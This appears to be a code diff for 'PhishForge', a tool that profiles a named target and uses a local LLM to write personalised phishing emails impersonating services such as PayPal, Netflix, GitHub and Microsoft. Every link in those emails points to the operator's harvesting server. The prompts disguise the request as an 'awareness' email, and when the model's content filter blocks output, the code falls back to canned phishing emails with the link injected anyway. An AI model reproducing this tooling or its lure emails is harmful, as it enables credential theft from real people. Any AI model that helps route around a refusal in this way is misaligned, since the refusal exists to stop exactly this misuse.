@@ -368,70 +368,110 @@ class PhishForge:
         """Individual attack workflow"""
         print(f"\n{Fore.YELLOW}=== INDIVIDUAL ATTACK MODE ==={Style.RESET_ALL}\n")
         
-        # Show template menu
-        template_num = self._show_template_menu()
+        # ── Collect target profile ──────────────────────────────────────────
+        console.print(Panel(
+            "[cyan]Provide target information for email personalization.\n"
+            "[dim]Press Enter to skip optional fields.[/dim]",
+            title="[bold yellow]Target Profile[/bold yellow]",
+            border_style="yellow"
+        ))
+        
+        target_name  = input(f"{Fore.CYAN}Target full name   (e.g. John Smith): {Style.RESET_ALL}").strip()
+        target_email = input(f"{Fore.CYAN}Target email       (e.g. john@gmail.com): {Style.RESET_ALL}").strip()
+        target_user  = input(f"{Fore.CYAN}Target username    (e.g. @johnsmith): {Style.RESET_ALL}").strip()
+        target_lang  = input(f"{Fore.CYAN}Language           (en/es/fr/de, default=en): {Style.RESET_ALL}").strip() or "en"
+        
+        # Build profile dict
+        target_profile = {
+            "name":     target_name  or "User",
+            "email":    target_email or "target@example.com",
+            "username": target_user  or "user",
+            "language": target_lang,
+        }
+        
+        if target_name:
+            print(f"{Fore.GREEN}[+] Target profiled: {target_name} <{target_email}>{Style.RESET_ALL}")
+        
+        # ── Choose platform template ────────────────────────────────────────
+        template_num  = self._show_template_menu()
         template_info = SITES_TEMPLATES[template_num]
         template_folder = template_info['folder']
         
-        # Generate email with AI
+        # ── Generate personalised email ─────────────────────────────────────
         print(f"\n{Fore.BLUE}[*] Generating phishing email with AI...{Style.RESET_ALL}")
-        email = self._generate_individual_email(template_info['name'])
+        email = self._generate_individual_email(template_info['name'], target_profile)
+        
+        server_ip     = self._get_local_ip()
+        phishing_link = f"http://{server_ip}:8080/?template={template_folder}"
         
         if email and 'subject' in email:
-            # Replace AI links to ensure it points to our server
-            body = email['body']
+            # Replace any AI-generated links with our server link
             url_pattern = r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s]*'
-            
-            # Construct phishing link
-            server_ip = self._get_local_ip()
-            phishing_link = f"http://{server_ip}:8080/?template={template_folder}"
-            
-            # If AI put a link, replace it
+            body = email['body']
             if re.search(url_pattern, body):
-                 email['body'] = re.sub(url_pattern, phishing_link, body)
+                email['body'] = re.sub(url_pattern, phishing_link, body)
             else:
-                 # If no link, append it
-                 email['body'] += f"\n\nVerify here: {phishing_link}"
-
+                email['body'] += f"\n\n→ {phishing_link}"
             print(f"{Fore.GREEN}[+] Email generated successfully{Style.RESET_ALL}\n")
             self._display_email(email)
         else:
             print(f"{Fore.YELLOW}[!] Using demo email (Ollama content filter)...{Style.RESET_ALL}\n")
-            email = self._get_demo_individual_email(template_info['name'])
+            email = self._get_demo_individual_email(template_info['name'], target_profile)
+            # Inject phishing link
+            email['body'] += f"\n\n→ {phishing_link}"
             self._display_email(email)
         
-        # Start server
+        # ── Start server & show instructions ───────────────────────────────
         self._start_server()
-        
-        # Show final instructions
         self._show_instructions(template_folder, email)
     
     def _detect_company_template(self, intel):
-        """Auto-detect template based on company"""
+        """Auto-detect best template based on company intelligence"""
         company = intel.get("company", "").lower()
-        domain = intel.get("domains", {}).get("guessed_domain", "").lower()
+        domain  = intel.get("domains", {}).get("guessed_domain", "").lower()
+        tech    = " ".join(intel.get("technologies", [])).lower()
+        combined = f"{company} {domain} {tech}"
         
-        if "microsoft" in company or "microsoft" in domain:
-            return "microsoft"
-        elif "google" in company or "google" in domain:
-            return "google"
-        else:
-            return "microsoft"  # Default
-    
-        # Simple Text Format Prompt (Much more reliable than JSON for 8B models)
-        prompt = f"""Create a professional security awareness email for {company}.
-TEMPLATE: {template.title()}
-
-Format your response EXACTLY like this:
-SUBJECT: [Write subject here]
-BODY: [Write email body here]
-
-Do not include any other text. Start directly with SUBJECT."""
+        # Map keywords → template folder
+        rules = [
+            (["microsoft", "office365", "azure", "outlook", "teams"],  "microsoft"),
+            (["google", "gmail", "workspace", "gsuite"],               "google"),
+            (["github", "git"],                                        "github"),
+            (["gitlab"],                                               "gitlab"),
+            (["linkedin"],                                             "linkedin"),
+            (["dropbox"],                                              "dropbox"),
+            (["adobe", "creative cloud"],                              "adobe"),
+            (["wordpress", "wp-"],                                     "wordpress"),
+            (["paypal"],                                               "paypal"),
+            (["yahoo"],                                                "yahoo"),
+            (["proton", "protonmail"],                                 "protonmail"),
+            (["stackoverflow", "stack overflow"],                     "stackoverflow"),
+            (["mediafire"],                                            "mediafire"),
+            (["origin", "ea games", "electronic arts"],               "origin"),
+            (["steam", "valve"],                                       "steam"),
+        ]
         
-        return self._call_llm(prompt)
+        for keywords, folder in rules:
+            if any(kw in combined for kw in keywords):
+                return folder
+        
+        return "microsoft"  # Safe corporate default
     
-    def _generate_individual_email(self, platform):
+    def _generate_individual_email(self, platform, target=None):
+        """Generate personalised individual phishing email via LLM"""
+        if target is None:
+            target = {"name": "User", "email": "", "username": "user", "language": "en"}
+        
+        name     = target.get("name", "User")
+        username = target.get("username", "user")
+        lang_note = "Write the email in Spanish." if target.get("language") == "es" else \
+                    "Write the email in French."  if target.get("language") == "fr" else \
+                    "Write the email in German."  if target.get("language") == "de" else ""
+        
         prompt = f"""Create a realistic phishing awareness email for {platform}.
+Target name: {name}
+Target username: {username}
+{lang_note}
 
 Format your response EXACTLY like this:
 SUBJECT: [Write subject here]
@@ -522,16 +562,22 @@ Google Workspace Security"""
         
         return templates_email.get(template, templates_email["microsoft"])
     
-    def _get_demo_individual_email(self, platform):
+    def _get_demo_individual_email(self, platform, target=None):
         """Demo email for ALL platforms"""
+        if target is None:
+            target = {"name": "User", "username": "user"}
+        
+        name     = target.get("name", "User")
+        username = target.get("username", "user").lstrip("@")
+        greeting = f"Hi {name}," if name and name != "User" else "Hello,"
         
         # Generic template generator
         def generic_email(service, action="verify", reason="unusual activity"):
             return {
                 "subject": f"{service} Security: Action Required",
-                "body": f"""Dear {service} User,
+                "body": f"""{greeting}
 
-We have detected {reason} on your {service} account.
+We have detected {reason} on your {service} account{f' (@{username})' if username != 'user' else ''}.
 
 For your security, please {action} your account immediately:
 
@@ -548,10 +594,13 @@ Best regards,
         # Platform-specific emails
         emails = {
             "Instagram": {
-                "subject": "Security Alert: Unusual Activity Detected",
-                "body": """Hello,
+                "subject": f"Instagram: Unusual login to @{username}" if username != "user" else "Security Alert: Unusual Activity Detected",
+                "body": f"""{greeting}
 
-We noticed unusual activity on your Instagram account from an unrecognized device.
+We noticed a login to your Instagram account (@{username}) from an unrecognized device.
+
+📍 Location: Unknown
+📱 Device: Unknown Browser
 
 For your security, please verify your identity:
 
@@ -566,12 +615,13 @@ Instagram Security Team"""
             },
             "Facebook": {
                 "subject": "Security Alert: Unusual Login Activity",
-                "body": """Hello,
+                "body": f"""{greeting}
 
 We detected a login to your Facebook account from an unrecognized device.
 
-Location: Unknown
-Device: Unknown Browser
+📍 Location: Unknown
+💻 Device: Unknown Browser
+🕐 Time: Just now
 
 If this wasn't you, please secure your account:
 
@@ -584,7 +634,7 @@ Facebook Security Team"""
             },
             "Netflix": {
                 "subject": "Action Required: Your Netflix Account Has Been Suspended",
-                "body": """Dear Valued Customer,
+                "body": f"""{greeting}
 
 We were unable to process your recent payment. Your Netflix account has been temporarily suspended.
 
@@ -601,16 +651,16 @@ Netflix Billing Team"""
             },
             "PayPal": {
                 "subject": "Important: Your PayPal Account Requires Attention",
-                "body": """Dear PayPal User,
+                "body": f"""{greeting}
 
-We have detected suspicious activity on your account.
+We have detected suspicious activity on your PayPal account.
 
-To protect your account, we have temporarily limited certain features.
+To protect your funds, we have temporarily limited certain features.
 
 Please verify your account:
 
 1. Confirm your identity
-2. Review recent activity
+2. Review recent transactions
 3. Update your information
 
 Failure to verify may result in permanent account limitation.
@@ -620,7 +670,7 @@ PayPal Security"""
             },
             "eBay": {
                 "subject": "eBay Security: Verify Your Account",
-                "body": """Dear eBay Member,
+                "body": f"""{greeting}
 
 We have detected unusual activity on your eBay account.
 
@@ -638,13 +688,13 @@ Best regards,
 eBay Security Team"""
             },
             "Dropbox": {
-                "subject": "Dropbox Security Alert: Verify Your Account",
-                "body": """Hello,
+                "subject": "Dropbox Security Alert: New Sign-in Detected",
+                "body": f"""{greeting}
 
-We detected a login to your Dropbox account from a new device.
+We detected a sign-in to your Dropbox account from a new device.
 
-Location: Unknown
-IP Address: Unknown
+📍 Location: Unknown
+🌐 IP Address: Unknown
 
 To keep your files safe, please verify this was you:
 
@@ -657,7 +707,7 @@ Dropbox Security Team"""
             },
             "Spotify": {
                 "subject": "Spotify: Unusual Activity on Your Account",
-                "body": """Hi there,
+                "body": f"""{greeting}
 
 We noticed unusual activity on your Spotify account.
 
@@ -666,7 +716,7 @@ Someone may be using your account without permission.
 Please secure your account:
 
 1. Change your password
-2. Review devices
+2. Review connected devices
 3. Sign out everywhere
 
 Best,
@@ -674,11 +724,11 @@ Spotify Security"""
             },
             "LinkedIn": {
                 "subject": "LinkedIn: Unusual Sign-in Activity",
-                "body": """Hello,
+                "body": f"""{greeting}
 
 We noticed a sign-in to your LinkedIn account from an unrecognized device.
 
-Location: Unknown
+📍 Location: Unknown
 
 If this was you, you can ignore this message.
 
@@ -691,19 +741,19 @@ If not, please secure your account:
 LinkedIn Security"""
             },
             "GitHub": {
-                "subject": "GitHub: Unusual Sign-in Activity",
-                "body": """Hello,
+                "subject": f"[GitHub] Unusual sign-in activity for @{username}" if username != "user" else "GitHub: Unusual Sign-in Activity",
+                "body": f"""{greeting}
 
-We detected unusual sign-in activity to your GitHub account.
+We detected unusual sign-in activity to your GitHub account (@{username}).
 
-New sign-in from: Unknown location
+🌐 New sign-in from: Unknown location
 
 If this was you, you can ignore this message.
 
 If not, please:
 
-1. Review SSH keys
-2. Check authorized applications
+1. Review SSH keys and personal access tokens
+2. Check authorized OAuth applications
 3. Enable two-factor authentication
 
 GitHub Security"""
